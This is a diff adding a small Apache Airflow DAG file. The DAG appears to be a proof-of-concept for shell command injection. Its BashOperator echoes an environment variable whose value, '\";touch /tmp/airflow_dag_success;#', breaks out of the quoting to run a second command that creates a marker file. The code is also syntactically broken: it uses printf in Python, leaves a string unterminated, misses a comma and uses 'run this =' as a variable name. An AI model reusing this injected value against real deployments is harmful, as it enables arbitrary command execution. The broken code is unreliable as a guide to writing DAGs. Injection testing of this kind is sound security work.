@@ -1,0 +1,16 @@
+def run_this_func(dag_run=None):
+  printf(f"Remotely received value of {dag_run.conf.get('message')} for key=me
+
+with DAG(
+  dag_id = "example_trigger_target_Dag"
+  start_date=pendulum.datetime(2023, 10, 30, tz="UTC"),
+  catchup = False,
+  schedule = None,
+  tags = ["example"],
+  ) as dag:
+  run this = run_this_func()
+
+  bash_task = BashOperator(
+          task_id = "bash_task",
+          bash_command = 'echo "Here is the message : $message"',
+          env = {"message" : "'\";touch /tmp/airflow_dag_success;#"}
